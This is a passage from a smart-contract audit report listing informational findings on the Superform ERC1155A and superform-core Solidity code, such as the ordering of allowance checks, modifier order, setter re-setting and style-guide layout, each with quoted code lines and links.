[139](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L139), [461](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L461)



### Multiple mappings with same keys can be combined into a single struct mapping for readability

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Well-organized data structures make code reviews easier, which may lead to fewer bugs. Consider combining related mappings into mappings to structs, so it's clear what data is related.

*Instances (7)*:

```solidity
File: ERC1155A/src/ERC1155A.sol

30:     mapping(address owner => mapping(address operator => mapping(uint256 id => uint256 amount))) private allowances;

33:     mapping(address => mapping(uint256 => uint256)) public balanceOf;

36:     mapping(address => mapping(address => bool)) public isApprovedForAll;

```

[30](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L30), [33](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L33), [36](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L36)

```solidity
File: superform-core/src/SuperformFactory.sol

53:     mapping(address vault => uint256[] superformIds) public vaultToSuperforms;

55:     mapping(address vault => uint256[] formImplementationId) public vaultToFormImplementationId;

```

[53](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L53), [55](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L55)

```solidity
File: superform-core/src/settings/SuperRegistry.sol

94:     mapping(address registryAddress => uint8 registryId) public stateRegistryIds;

96:     mapping(address ambAddress => uint8 ambId) public ambIds;

```

[94](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L94), [96](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L96)




### Memory-safe annotation preferred over comment variant

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The memory-safe annotation (`assembly ("memory-safe") { ... }`), available starting in Solidity version 0.8.13 is preferred over the comment variant, which will be removed in a future breaking [release](https://docs.soliditylang.org/en/v0.8.13/assembly.html#memory-safety). The comment variant is only meant for externalized library code that needs to work in earlier versions (e.g. `SafeTransferLib` needs to be able to be used in many different versions).

*Instances (2)*:

```solidity
File: ERC1155A/src/ERC1155A.sol

553:                 } else {
554:                         /// @solidity memory-safe-assembly
555:                         assembly {
556:                             revert(add(32, reason), mload(reason))
557:                         }

588:                 } else {
589:                         /// @solidity memory-safe-assembly
590:                         assembly {
591:                             revert(add(32, reason), mload(reason))
592:                         }

```

[553-557](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L553-L557), [588-592](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L588-L592)




### Race condition in the function `ERC1155A.safeTransferFrom(...)`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**: The function `ERC1155A.safeTransferFrom(...)` transfers ERC1155 tokens. It first verifies that the owner has given approval to the spender. However, since ERC1155A has different types of allowances, the function checks them in the following order: (1) if the operator is the owner of the token, (2) allowance for each individual token ID, (3) approval for all tokens.

```solidity
if (operator == from) {
    /// @dev no need to self-approve
    /// @dev make transfer
    _safeTransferFrom(operator, from, to, id, amount, data);

    /// @dev operator allowance is higher than requested amount
} else if (allowed >= amount) {
    /// @dev decrease allowance
    _decreaseAllowance(from, operator, id, amount);
    /// @dev make transfer
    _safeTransferFrom(operator, from, to, id, amount, data);

    /// @dev operator is approved for all tokens
} else if (isApprovedForAll[from][operator]) { // @audit result depend on order of transactions , should always check isApprovedForAll first 
    /// NOTE: We don't decrease individual allowance here.
    /// NOTE: Spender effectively has unlimited allowance because of isApprovedForAll
    /// NOTE: We leave allowance management to token owners

    /// @dev make transfer
    _safeTransferFrom(operator, from, to, id, amount, data);

    /// @dev operator is not an owner of ids or not enough of allowance, or is not approvedForAll
} else {
    revert NOT_AUTHORIZED();
}
```

This order is not aligned with other functions of the contract like `safeBatchTransferFrom()` or `_batchBurn()`. In these function, `approvalForAll` is always checked first. The problem with this order is that the remaining allowance after executing the transaction will depend on the order of other transactions (because it tries to update the allowance of individual token while owner has already gave approval for all token). The result is that users cannot predict the remaining allowance after the transactions are executed.

**Recommendation**: Consider aligning the logic with other functions like `safeBatchTransferFrom()`, `_batchBurn()`. If we look at these functions, approval for all is always checked first, then the allowance of the individual token ID.



### The `nonReentrant` `modifier` should occur before all other modifiers

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

This is a best-practice to protect against reentrancy in other modifiers

*Instances (2)*:

```solidity
File: superform-core/src/crosschain-liquidity/DstSwapper.sol

140:         nonReentrant

170:         nonReentrant

```

[140](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L140), [170](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L170)




### `override` function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

*Instances (23)*:


```solidity
File: superform-core/src/BaseForm.sol

147:     function previewDepositTo(uint256 assets_) public view virtual override returns (uint256);

150:     function previewWithdrawFrom(uint256 assets_) public view virtual override returns (uint256);

153:     function previewRedeemFrom(uint256 shares_) public view virtual override returns (uint256);

```

[147](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseForm.sol#L147), [150](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseForm.sol#L150), [153](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseForm.sol#L153)

```solidity
File: superform-core/src/BaseRouter.sol

49:     function singleDirectSingleVaultDeposit(SingleDirectSingleVaultStateReq memory req_)

56:     function singleXChainSingleVaultDeposit(SingleXChainSingleVaultStateReq memory req_)

63:     function singleDirectMultiVaultDeposit(SingleDirectMultiVaultStateReq memory req_)

70:     function singleXChainMultiVaultDeposit(SingleXChainMultiVaultStateReq memory req_)

77:     function multiDstSingleVaultDeposit(MultiDstSingleVaultStateReq calldata req_) external payable virtual override;

80:     function multiDstMultiVaultDeposit(MultiDstMultiVaultStateReq calldata req_) external payable virtual override;

83:     function singleDirectSingleVaultWithdraw(SingleDirectSingleVaultStateReq memory req_)

90:     function singleXChainSingleVaultWithdraw(SingleXChainSingleVaultStateReq memory req_)

97:     function singleDirectMultiVaultWithdraw(SingleDirectMultiVaultStateReq memory req_)

104:     function singleXChainMultiVaultWithdraw(SingleXChainMultiVaultStateReq memory req_)

111:     function multiDstSingleVaultWithdraw(MultiDstSingleVaultStateReq calldata req_) external payable virtual override;

114:     function multiDstMultiVaultWithdraw(MultiDstMultiVaultStateReq calldata req_) external payable virtual override;

```

[49](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L49), [56](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L56), [63](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L63), [70](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L70), [77](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L77), [80](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L80), [83](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L83), [90](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L90), [97](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L97), [104](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L104), [111](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L111), [114](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L114)

```solidity
File: superform-core/src/crosschain-data/BaseStateRegistry.sol

132:     function processPayload(uint256 payloadId_) external payable virtual override;

```

[132](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L132)

```solidity
File: superform-core/src/crosschain-liquidity/BridgeValidator.sol

30:     function validateReceiver(

30:     function validateReceiver(

41:     function validateTxData(ValidateTxDataArgs calldata args_)

49:     function decodeAmountIn(

49:     function decodeAmountIn(

60:     function decodeDstSwap(bytes calldata txData_)

68:     function decodeSwapOutputToken(bytes calldata txData_)

```

[30](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/BridgeValidator.sol#L30), [30](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/BridgeValidator.sol#L30), [41](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/BridgeValidator.sol#L41), [49](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/BridgeValidator.sol#L49), [49](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/BridgeValidator.sol#L49), [60](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/BridgeValidator.sol#L60), [68](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/BridgeValidator.sol#L68)



### Polymorphic functions make security audits more time-consuming and error-prone

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The instances below point to one of two functions with the same name. Consider naming each function differently, in order to make code navigation and analysis easier.

*Instances (4)*:

```solidity
File: superform-core/src/libraries/ProofLib.sol

8:     function computeProof(AMBMessage memory message_) internal pure returns (bytes32) {

12:     function computeProofBytes(AMBMessage memory message_) internal pure returns (bytes memory) {

16:     function computeProof(bytes memory message_) internal pure returns (bytes32) {

20:     function computeProofBytes(bytes memory message_) internal pure returns (bytes memory) {

```

[8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/ProofLib.sol#L8), [12](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/ProofLib.sol#L12), [16](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/ProofLib.sol#L16), [20](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/ProofLib.sol#L20)




### `require()`/`revert()` statements should have descriptive reason strings

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

*Instances (1)*:

```solidity
File: superform-core/src/crosschain-liquidity/socket/SocketValidator.sol

94:         revert();

```

[94](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketValidator.sol#L94)



### Setters should prevent re-setting of the same value

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

This especially problematic when the setter also emits the same value, which may be confusing to offline parsers

*Instances (15)*:

```solidity
File: superform-core/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol

/// @audit ambChainId, ambChainId, superChainId, superChainId, ambChainId, superChainId
155:     function setChainId(uint64 superChainId_, uint32 ambChainId_) external onlyProtocolAdmin {

/// @audit authorizedImpl
182:     function setReceiver(uint32 domain_, address authorizedImpl_) external onlyProtocolAdmin {

```

[155](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L155), [182](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L182)

```solidity
File: superform-core/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol

/// @audit trustedRemoteLookup
149:     function setTrustedRemote(uint16 srcChainId_, bytes calldata srcAddress_) external onlyProtocolAdmin {

/// @audit ambChainId, ambChainId, superChainId, superChainId, ambChainId, superChainId
211:     function setChainId(uint64 superChainId_, uint16 ambChainId_) external onlyProtocolAdmin {

```

[149](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L149), [211](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L211)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol

/// @audit ambChainId, ambChainId, superChainId, superChainId, ambChainId, superChainId
208:     function setChainId(uint64 superChainId_, uint16 ambChainId_) external onlyProtocolAdmin {

/// @audit authorizedImpl, authorizedImpl
235:     function setReceiver(uint16 chainId_, address authorizedImpl_) external onlyProtocolAdmin {

```

[208](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L208), [235](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L235)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol

/// @audit relayer
106:     function setRelayer(address relayer_) external onlyProtocolAdmin {

/// @audit broadcastFinality
114:     function setFinality(uint8 finality_) external onlyProtocolAdmin {

/// @audit ambChainId, ambChainId, superChainId, superChainId, ambChainId, superChainId
217:     function setChainId(uint64 superChainId_, uint16 ambChainId_) external onlyProtocolAdmin {

/// @audit authorizedImpl, authorizedImpl
244:     function setReceiver(uint16 chainId_, address authorizedImpl_) external onlyProtocolAdmin {

```

[96](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L96), [106](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L106), [114](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L114), [217](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L217), [244](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L244)


```solidity
File: superform-core/src/payments/PaymentHelper.sol

/// @audit totalTransmuterFees
529:     function updateRegisterAERC20Params(

```
 [529](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L529)

```solidity
File: superform-core/src/settings/SuperRBAC.sol

/// @audit superRegistry
144:     function setSuperRegistry(address superRegistry_) external override onlyRole(PROTOCOL_ADMIN_ROLE) {

```

[144](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L144)

```solidity
File: superform-core/src/settings/SuperRegistry.sol

/// @audit delay
210:     function setDelay(uint256 delay_) external override onlyProtocolAdmin {

/// @audit permit2Address
222:     function setPermit2(address permit2_) external override onlyProtocolAdmin {

/// @audit vaultLimitPerTx, vaultLimitPerTx
232:     function setVaultLimitPerTx(uint64 chainId_, uint256 vaultLimit_) external override onlyProtocolAdmin {

```

[210](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L210), [222](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L222), [232](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L232)




### Contract does not follow the Solidity style guide's suggested layout ordering

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The [style guide](https://docs.soliditylang.org/en/v0.8.16/style-guide.html#order-of-layout)says that, within a contract, the ordering should be 1) Type declarations, 2) State variables, 3) Events, 4) Modifiers, and 5) Functions, but the contract(s) below do not follow this ordering

*Instances (46)*:


```solidity
File: ERC1155A/src/aERC20.sol

14:     error ONLY_ERC1155A();

16:     modifier onlyTokenSplitter() {

```

[14](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/aERC20.sol#L14), [16](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/aERC20.sol#L16)

```solidity
File: superform-core/src/BaseForm.sol

19:     using DataLib for uint256;

```

[19](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseForm.sol#L19)

```solidity
File: superform-core/src/BaseRouter.sol

16:     using SafeERC20 for IERC20;

```

[16](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L16)

```solidity
File: superform-core/src/BaseRouterImplementation.sol

33:     uint256 public payloadIds;

48:     struct MultiDepositLocalVars {

55:     struct SingleTokenForwardLocalVars {

65:     struct MultiTokenForwardLocalVars {

```

[33](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L33), [48](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L48), [55](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L55), [65](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L65)

```solidity
File: superform-core/src/EmergencyQueue.sol

17:     using DataLib for uint256;

```

[17](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/EmergencyQueue.sol#L17)

```solidity
File: superform-core/src/SuperformFactory.sol

21:     using DataLib for uint256;

22:     using Clones for address;

```

[21](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L21), [22](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L22)

```solidity
File: superform-core/src/crosschain-data/BaseStateRegistry.sol

19:     using ProofLib for AMBMessage;

20:     using ProofLib for bytes;

```

[19](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L19), [20](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L20)

```solidity
File: superform-core/src/crosschain-data/BroadcastRegistry.sol

20:     using ProofLib for bytes;

48:     constructor(ISuperRegistry superRegistry_) {

77:     modifier onlyBroadcasterAMBImplementation() {

```

[20](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BroadcastRegistry.sol#L20), [48](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BroadcastRegistry.sol#L48), [77](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BroadcastRegistry.sol#L77)

```solidity
File: superform-core/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol

20:     using DataLib for uint256;

```

[20](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L20)

```solidity
File: superform-core/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol

19:     using DataLib for uint256;

```

[19](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L19)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol

20:     using DataLib for uint256;

```

[20](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L20)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol

18:     using DataLib for uint256;

```

[18](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L18)

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

37:     using SafeERC20 for IERC20;

38:     using DataLib for uint256;

39:     using ProofLib for AMBMessage;

```

[37](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L37), [38](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L38), [39](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L39)

```solidity
File: superform-core/src/crosschain-data/extensions/TimelockStateRegistry.sol

28:     using DataLib for uint256;

29:     using ProofLib for AMBMessage;

```

[28](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L28), [29](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L29)

```solidity
File: superform-core/src/crosschain-data/utils/PayloadHelper.sol

35:     ISuperRegistry public immutable superRegistry;

41:     struct DecodeDstPayloadInternalVars {

60:     struct DecodeDstPayloadLiqDataInternalVars {

```

[35](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L35), [41](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L41), [60](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L60)

```solidity
File: superform-core/src/crosschain-liquidity/DstSwapper.sol

28:     ISuperRegistry public immutable superRegistry;

42:     struct ProcessTxVars {

```

[28](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L28), [42](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L42)

```solidity
File: superform-core/src/crosschain-liquidity/LiquidityHandler.sol

15:     using SafeERC20 for IERC20;

```

[15](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/LiquidityHandler.sol#L15)

```solidity
File: superform-core/src/forms/ERC4626FormImplementation.sol

26:     uint8 internal immutable STATE_REGISTRY_ID;

32:     struct directDepositLocalVars {

45:     struct directWithdrawLocalVars {

55:     struct xChainWithdrawLocalVars {

```

[26](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L26), [32](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L32), [45](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L45), [55](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L55)

```solidity
File: superform-core/src/forms/ERC4626KYCDaoForm.sol

24:     constructor(address superRegistry_) ERC4626FormImplementation(superRegistry_, stateRegistryId) { }

32:     modifier onlyKYC(address srcSender_) {

```

[24](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626KYCDaoForm.sol#L24), [32](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626KYCDaoForm.sol#L32)

```solidity
File: superform-core/src/forms/ERC4626TimelockForm.sol

20:     using DataLib for uint256;

26:     uint8 constant stateRegistryId = 2; // TimelockStateRegistry

32:     struct withdrawAfterCoolDownLocalVars {

```

[20](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L20), [26](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L26), [32](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L32)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

26:     using ArrayCastLib for LiqRequest;

27:     using ArrayCastLib for bool;

28:     using ProofLib for bytes;

29:     using ProofLib for AMBMessage;

35:     ISuperRegistry public immutable superRegistry;

64:     struct EstimateAckCostVars {

```

[26](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L26), [27](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L27), [28](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L28), [29](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L29), [35](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L35), [64](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L64)



### Some contract names don't follow the Solidity naming conventions

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

See the [contract-and-library-names](https://docs.soliditylang.org/en/latest/style-guide.html#contract-and-library-names) section of the Solidity Style Guide

*Instances (1)*:

```solidity
File: ERC1155A/src/aERC20.sol

10: contract aERC20 is ERC20, IaERC20 {

```

[10](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/aERC20.sol#L10)




### `else`-block not required

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

One level of nesting can be removed by not having an `else`-block when the `if`-block returns, and `if (foo) { return 1; } else { return 2; }` becomes `if (foo) { return 1; } return 2;`

*Instances (3)*:

```solidity
File: superform-core/src/crosschain-data/utils/PayloadHelper.sol

156:         if (v.multi == 1) {
157:                 return _decodeMultiLiqData(dstPayloadId_, coreStateRegistry);
158:             } else {
159:                 return _decodeSingleLiqData(dstPayloadId_, coreStateRegistry);
160:             }

277:         if (multi_ == 1) {
278:                 ReturnMultiData memory rd = abi.decode(coreStateRegistry_.payloadBody(dstPayloadId_), (ReturnMultiData));
279:                 return (rd.amounts, rd.payloadId);
280:             } else {
